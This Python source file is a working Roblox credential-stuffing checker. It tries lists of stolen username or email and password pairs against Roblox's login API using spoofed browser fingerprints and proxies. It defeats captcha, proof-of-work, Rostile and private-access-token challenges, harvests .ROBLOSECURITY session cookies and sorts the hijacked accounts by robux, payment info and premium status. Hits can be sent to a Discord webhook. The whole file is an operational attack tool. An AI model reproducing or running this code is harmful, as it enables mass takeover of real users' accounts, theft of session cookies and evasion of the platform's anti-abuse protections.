import sys
from base64 import b64decode, b64encode
from json import dumps, loads
from time import sleep

from account_info import AccountInfo
from auth_intent import AuthIntent
from counter import Counter
from custom_solver import get_token
from output import Output
from proof_of_work import RepeatedSquaringSolver
from rostile import Rostile
from session import Session
from thread_lock import ThreadLock
from util import Util

config = Util.get_config()

WEBHOOK_ENABLED = config.get("logWebhook", False)
WEBHOOK_URL = config.get("webhook", "")

if not isinstance(WEBHOOK_ENABLED, bool):
    Output("ERROR").log("logWebhook must be true or false in config.json")
    sys.exit(1)

if WEBHOOK_ENABLED:
    from discord_webhook import DiscordEmbed, DiscordWebhook

CAPTCHA_PK = "476068BF-9607-4799-B53D-966BE98E2B81"


class InvalidAccountError(Exception):
    pass


class RateLimitError(Exception):
    pass


class Roblox:
    MAX_ATTEMPTS = 10

    def __init__(self, lock: ThreadLock, counter: Counter, accounts: list[str]):
        self.lock = lock
        self.counter = counter
        self.accounts = accounts

        self._account: list[str] | None = None
        self._attempts = 0
        self._checked = False

        self._session = None
        self._sec_ch_ua = ""
        self._user_agent = ""
        self._proxy = ""
        self._accept_language = ""
        self._cookie_header = ""
        self._ctype = ""
        self._sec_auth_intent = None

    # ── Account queue ──────────────────────────────────────────────

    def _get_next_account(self) -> bool:
        idx = self.counter.get_and_increment()
        if idx >= len(self.accounts):
            return False
        self._account = self.accounts[idx].split(":", 1)
        self._attempts = 0
        self._checked = False
        return True

    # ── Header builders ────────────────────────────────────────────

    def _build_page_headers(self) -> dict:
        return {
            "sec-ch-ua": self._sec_ch_ua,
            "sec-ch-ua-mobile": "?0",
            "sec-ch-ua-platform": '"Windows"',
            "upgrade-insecure-requests": "1",
            "user-agent": self._user_agent,
            "accept": (
                "text/html,application/xhtml+xml,application/xml;q=0.9,"
                "image/avif,image/webp,image/apng,*/*;q=0.8,"
                "application/signed-exchange;v=b3;q=0.7"
            ),
            "sec-fetch-site": "same-origin",
            "sec-fetch-mode": "navigate",
            "sec-fetch-user": "?1",
            "sec-fetch-dest": "document",
            "referer": "https://www.roblox.com/",
            "accept-encoding": "gzip, deflate, br, zstd",
            "accept-language": self._accept_language,
            "priority": "u=0, i",
        }

    def _build_api_headers(self, csrf: str | None = None) -> dict:
        headers = {
            "sec-ch-ua-platform": '"Windows"',
            "sec-ch-ua": self._sec_ch_ua,
            "sec-ch-ua-mobile": "?0",
            "user-agent": self._user_agent,
            "accept": "application/json, text/plain, */*",
            "content-type": "application/json;charset=UTF-8",
            "origin": "https://www.roblox.com",
            "sec-fetch-site": "same-site",
            "sec-fetch-mode": "cors",
            "sec-fetch-dest": "empty",
            "referer": "https://www.roblox.com/",
            "accept-encoding": "gzip, deflate, br, zstd",
            "accept-language": self._accept_language,
            "priority": "u=1, i",
            "cookie": self._cookie_header,
        }
        if csrf:
            headers["x-csrf-token"] = csrf
        return headers

    def _login_payload(self) -> dict:
        return {
            "ctype": self._ctype,
            "cvalue": self._account[0],
            "password": self._account[1],
            "secureAuthenticationIntent": self._sec_auth_intent,
        }

    # ── File output helpers ────────────────────────────────────────

    def _write_output(self, filepath: str, line: str) -> None:
        with self.lock.get_lock():
            with open(filepath, "a", encoding="utf-8") as f:
                f.write(line + "\n")

    def _account_line(self, cookie: str) -> str:
        return f"{self._account[0]}:{self._account[1]}:{cookie}"

    # ── Challenge: continue API ────────────────────────────────────

    def _continue_check(self, continue_payload: dict):
        """
        Submit challenge solution via the continue API, then re-attempt login.

        Returns:
            list[user_id, cookie]  – on successful login
            dict                   – captcha metadata if a follow-up captcha is required,
                                     or multi-account response data
        Raises:
            RateLimitError / ValueError / InvalidAccountError
        """
        sleep(1)
        content = dumps(continue_payload, separators=(",", ":")).encode("utf-8")
        response = self._session.post(
            "https://apis.roblox.com/challenge/v1/continue", content=content
        )

        resp_json = response.json()

        if resp_json.get("challengeType") == "captcha":
            return loads(resp_json["challengeMetadata"])

        if response.status_code != 200:
            raise ValueError("Rejected by continue API")

        self._session.headers = {
            **self._session.headers,
            "rblx-challenge-id": continue_payload["challengeId"],
            "rblx-challenge-metadata": b64encode(
                continue_payload["challengeMetadata"].encode("utf-8")
            ).decode("utf-8"),
            "rblx-challenge-type": continue_payload["challengeType"],
        }

        payload = self._login_payload()
        response = self._session.post("https://auth.roblox.com/v2/login", json=payload)

        csrf = response.headers.get("x-csrf-token")

        if csrf:
            self._session.headers["x-csrf-token"] = csrf
            response = self._session.post("https://auth.roblox.com/v2/login", json=payload)

        for key in ("rblx-challenge-id", "rblx-challenge-metadata", "rblx-challenge-type"):
            self._session.headers.pop(key, None)

        if response.status_code == 429:
            raise RateLimitError("Rate limited")

        if self._ctype == "Email" and "Received credentials belong to multiple accounts" in response.text:
            return response.json()

        if response.status_code == 200 and ".ROBLOSECURITY" in response.cookies:
            self._account[0] = response.json()["user"]["name"]
            return [response.json()["user"]["id"], response.cookies.get(".ROBLOSECURITY")]

        if "Challenge failed" in response.text:
            raise ValueError("Rejected by login API")

        raise InvalidAccountError("Invalid account")

    # ── Captcha solving (shared logic) ─────────────────────────────

    def _solve_captcha(self, blob: str, captcha_id: str, challenge_id: str):
        Output("CAPTCHA").log("Captcha detected")
        Output("CAPTCHA").log("Solving captcha")

        solution = get_token(self._session, blob, self._proxy)

        if solution is None:
            raise ValueError("Failed to solve captcha")

        token = solution.split("|")[0]
        token_info = solution.split(f"pk={CAPTCHA_PK}|")[1].split("|cdn_url=")[0]

        Output("CAPTCHA").log(f"Solved captcha | {token}|{token_info}")

        metadata = dumps(
            {"unifiedCaptchaId": captcha_id, "captchaToken": solution, "actionType": "Login"},
            separators=(",", ":"),
        )

        return self._continue_check({
            "challengeId": challenge_id,
            "challengeType": "captcha",
            "challengeMetadata": metadata,
        })

    def _handle_continue_result(self, result, challenge_id: str):
        if isinstance(result, dict) and "unifiedCaptchaId" in result:
            return self._solve_captcha(
                result["dataExchangeBlob"], result["unifiedCaptchaId"], challenge_id
            )
        return result

    # ── Challenge handlers ─────────────────────────────────────────

    def _handle_proofofwork(self, metadata: dict, challenge_id: str) -> tuple[str, str]:
        session_id = metadata["sessionId"]

        puzzle = self._session.get(
            f"https://apis.roblox.com/proof-of-work-service/v1/pow-puzzle?sessionID={session_id}"
        )

        solution = RepeatedSquaringSolver(loads(puzzle.json()["artifacts"])).solve()

        redemption = self._session.post(
            "https://apis.roblox.com/proof-of-work-service/v1/pow-puzzle",
            json={"sessionID": session_id, "solution": solution},
        ).json()["redemptionToken"]

        content = dumps({
            "challengeId": challenge_id,
            "challengeType": "proofofwork",
            "challengeMetadata": dumps(
                {"redemptionToken": redemption, "sessionId": session_id},
                separators=(",", ":"),
            ),
        }, separators=(",", ":")).encode("utf-8")

        result = loads(self._session.post(
            "https://apis.roblox.com/challenge/v1/continue", content=content
        ).json()["challengeMetadata"])

        return result.get("dataExchangeBlob"), result.get("unifiedCaptchaId")

    def _handle_rostile(self, challenge_id: str):
        Output("CAPTCHA").log("Rostile detected")

        payload = Rostile.get_solution(challenge_id)

        response = self._session.post("https://apis.roblox.com/rostile/v1/verify", json=payload)
        csrf = response.headers.get("x-csrf-token")

        if csrf:
            self._session.headers["x-csrf-token"] = csrf
            redemption_token = self._session.post(
                "https://apis.roblox.com/rostile/v1/verify", json=payload
            ).json()["redemptionToken"]
        else:
            redemption_token = response.json()["redemptionToken"]

        metadata = dumps({"redemptionToken": redemption_token}, separators=(",", ":"))

        result = self._continue_check({
            "challengeId": challenge_id,
            "challengeType": "rostile",
            "challengeMetadata": metadata,
        })

        return self._handle_continue_result(result, challenge_id)

    def _handle_pat(self, challenge_id: str):
        Output("CAPTCHA").log("PAT detected")
        payload = {"challengeId": challenge_id}

        response = self._session.post(
            "https://apis.roblox.com/private-access-token/v1/getPATToken", json=payload
        )

        www_auth = response.headers.get("www-authenticate", "")

        if "challenge=" in www_auth:
            token = www_auth.split("challenge=")[1]
            self._session.headers["Authorization"] = f"PrivateToken token={token}"

        redemption_token = self._session.post(
            "https://apis.roblox.com/private-access-token/v1/getPATToken", json=payload
        ).json()["redemptionToken"]

        metadata = dumps({"redemptionToken": redemption_token}, separators=(",", ":"))

        result = self._continue_check({
            "challengeId": challenge_id,
            "challengeType": "privateaccesstoken",
            "challengeMetadata": metadata,
        })

        return self._handle_continue_result(result, challenge_id)

    def _dispatch_challenge(self, challenge_type: str, metadata: dict, challenge_id: str):
        """Route a challenge response to the correct handler and return the login result."""
        if challenge_type == "proofofwork":
            blob, captcha_id = self._handle_proofofwork(metadata, challenge_id)
            return self._handle_direct_captcha(blob, captcha_id, challenge_id)
        elif challenge_type == "rostile":
            return self._handle_rostile(challenge_id)
        elif challenge_type == "privateaccesstoken":
            return self._handle_pat(challenge_id)
        else:
            blob = metadata.get("dataExchangeBlob")
            captcha_id = metadata.get("unifiedCaptchaId")

            return self._handle_direct_captcha(blob, captcha_id, challenge_id)

    def _handle_direct_captcha(self, blob: str, captcha_id: str, challenge_id: str):
        Output("CAPTCHA").log("Captcha detected")
        Output("CAPTCHA").log("Solving captcha")

        solution = get_token(self._session, blob, self._proxy)

        if solution is None:
            Output("CAPTCHA").log("Retrying captcha")

            payload = self._login_payload()
            response = self._session.post("https://auth.roblox.com/v2/login", json=payload)

            if response.status_code == 429:
                raise RateLimitError("Rate limited")

            ch_type = response.headers.get("rblx-challenge-type")

            if ch_type == "denied":
                raise ValueError("Challenge type denied")

            new_challenge_id = response.headers.get("rblx-challenge-id")
            meta = loads(b64decode(response.headers["rblx-challenge-metadata"]).decode("utf-8"))

            # The retry can return ANY challenge type, not just another captcha
            return self._dispatch_challenge(ch_type, meta, new_challenge_id)

        token = solution.split("|")[0]
        token_info = solution.split(f"pk={CAPTCHA_PK}|")[1].split("|cdn_url=")[0]
        Output("CAPTCHA").log(f"Solved captcha | {token}|{token_info}")

        metadata = dumps(
            {"unifiedCaptchaId": captcha_id, "captchaToken": solution, "actionType": "Login"},
            separators=(",", ":"),
        )

        return self._continue_check({
            "challengeId": challenge_id,
            "challengeType": "captcha",
            "challengeMetadata": metadata,
        })

    # ── Result processing ──────────────────────────────────────────

    def _process_login_result(self, result) -> None:
        if isinstance(result, dict) and "errors" in result:
            Output("SUCCESS").log(f"Valid account (multi) | {self._account[0]}")
            self._handle_multi(result)
        elif isinstance(result, list):
            user_id, cookie = result
            Output("SUCCESS").log(f"Valid account | {self._account[0]}")
            self._handle_valid(user_id, cookie)
        else:
            raise ValueError("Unexpected login result")
        
        self._checked = True

    def _handle_valid(self, user_id: int, cookie: str) -> None:
        account_line = self._account_line(cookie)

        self._write_output("output/valid.txt", account_line)

        self._cookie_header += f"; .ROBLOSECURITY={cookie}"
        self._session.headers = self._build_api_headers()

        info = AccountInfo.get_account_info(self._session, user_id)

        if WEBHOOK_ENABLED:
            self._send_webhook(info)

        # Write categorized output files

        self._write_output(f"output/robux/robux{info['robux']}.txt", account_line)
        self._write_output(f"output/rap/rap{info['rap']}.txt", account_line)
        self._write_output(f"output/pending/pending{info['pending']}.txt", account_line)
        self._write_output(f"output/summary/summary{info['summary']}.txt", account_line)

        if info["payment_info"] is True:
            self._write_output("output/payment_info/payment_info.txt", account_line)
        elif info["payment_info"] == "_unknown":
            self._write_output("output/payment_info/payment_info_unknown.txt", account_line)

        if info["premium"] is True:
            self._write_output("output/premium/premium.txt", account_line)
        elif info["premium"] == "_unknown":
            self._write_output("output/premium/premium_unknown.txt", account_line)

    def _handle_multi(self, response_data: dict) -> None:
        users = loads(response_data["errors"][0]["fieldData"])["users"]
        lines = [f"{user['name']}:{self._account[1]}" for user in users]

        with self.lock.get_lock():
            with open("output/multiple_linked.txt", "a", encoding="utf-8") as f:
                f.writelines(line + "\n" for line in lines)

        if WEBHOOK_ENABLED:
            self._send_webhook({})

    def _send_webhook(self, info: dict) -> None:
        try:
            webhook = DiscordWebhook(url=WEBHOOK_URL, content="@here")
            embed = DiscordEmbed(title=f"**Username: {self._account[0]}**", color="00FF00")

            for key, value in info.items():
                embed.add_embed_field(name=key, value=str(value), inline=True)

            embed.set_timestamp()
            webhook.add_embed(embed)
            webhook.execute()

        except Exception:
            pass

    # ── Main check loop ────────────────────────────────────────────

    def check(self) -> None:
        while True:
            try:
                if self._checked or self._account is None:
                    if not self._get_next_account():
                        return
                elif self._attempts >= self.MAX_ATTEMPTS:
                    Output("ERROR").log(f"Max retries reached | {self._account[0]}")
                    self._write_output(
                        "output/invalid.txt",
                        f"{self._account[0]}:{self._account[1]}",
                    )
                    if not self._get_next_account():
                        return

                Output("INFO").log(f"Checking account | {self._account[0]}")

                self._session, self._sec_ch_ua, self._user_agent, self._proxy = (
                    Session.create()
                )
                self._accept_language = f"{Util.get_random_string()};q=0.9,en;q=0.8"

                # Visit login page to collect cookies

                self._session.headers = self._build_page_headers()
                response = self._session.get("https://www.roblox.com/login")
                self._cookie_header = "; ".join(
                    f"{k}={v}" for k, v in response.cookies.items()
                )

                # Set API headers and get auth intent

                self._session.headers = self._build_api_headers()
                self._ctype = "Email" if "@" in self._account[0] else "Username"
                self._sec_auth_intent = AuthIntent.get_auth_intent(self._session)

                # First login attempt → get CSRF token

                payload = self._login_payload()
                response = self._session.post("https://auth.roblox.com/v2/login", json=payload)

                if response.status_code == 429:
                    raise RateLimitError("Rate limited")

                csrf = response.headers.get("x-csrf-token")
                self._session.headers = self._build_api_headers(csrf)

                # Second login attempt with CSRF

                response = self._session.post("https://auth.roblox.com/v2/login", json=payload)

                if response.status_code == 429:
                    raise RateLimitError("Rate limited")

                # Multi-account email

                if (
                    self._ctype == "Email"
                    and "Received credentials belong to multiple accounts" in response.text
                ):
                    Output("SUCCESS").log(f"Valid account (multi) | {self._account[0]}")

                    self._handle_multi(response.json())
                    self._checked = True

                    continue

                # Direct login success

                if response.status_code == 200 and ".ROBLOSECURITY" in response.cookies:
                    user_id = response.json()["user"]["id"]
                    cookie = response.cookies.get(".ROBLOSECURITY")

                    self._account[0] = response.json()["user"]["name"]

                    Output("SUCCESS").log(f"Valid account | {self._account[0]}")

                    self._handle_valid(user_id, cookie)
                    self._checked = True

                    continue

                # Challenge required

                if "Challenge" not in response.text:
                    raise InvalidAccountError("Invalid account")

                challenge_type = response.headers.get("rblx-challenge-type")
                if challenge_type == "denied":
                    raise ValueError("Challenge type denied")

                challenge_id = response.headers.get("rblx-challenge-id")
                raw_metadata = response.headers.get("rblx-challenge-metadata", "")
                metadata = loads(b64decode(raw_metadata).decode("utf-8"))

                result = self._dispatch_challenge(challenge_type, metadata, challenge_id)
                self._process_login_result(result)

            except InvalidAccountError:
                self._checked = True
                Output("ERROR").log(f"Invalid account | {self._account[0]}")
                self._write_output(
                    "output/invalid.txt",
                    f"{self._account[0]}:{self._account[1]}",
                )

            except RateLimitError:
                Output("ERROR").log("Rate limited")
                self._attempts += 1

            except Exception as e:
                Output("ERROR").log(str(e))
                self._attempts += 1